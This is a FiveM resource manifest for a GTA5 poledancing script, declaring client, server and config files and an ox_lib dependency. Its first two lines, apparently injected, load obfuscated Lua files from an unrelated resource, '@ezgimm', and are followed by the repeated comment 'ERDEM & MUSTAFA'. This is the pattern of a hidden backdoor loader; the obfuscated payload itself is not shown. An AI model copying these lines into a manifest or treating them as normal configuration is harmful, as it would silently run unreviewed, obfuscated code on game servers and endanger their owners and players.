shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA

fx_version 'cerulean'
version '1.0.0'
game 'gta5'
lua54 'yes'
author 'Bostra'
description 'FiveM Poledancing'
client_scripts { "client/client.lua" }
files { 'config/config.lua' }
shared_scripts { "@ox_lib/init.lua", "config/config.lua" }
server_scripts { "server/server.lua" }
dependency 'ox_lib'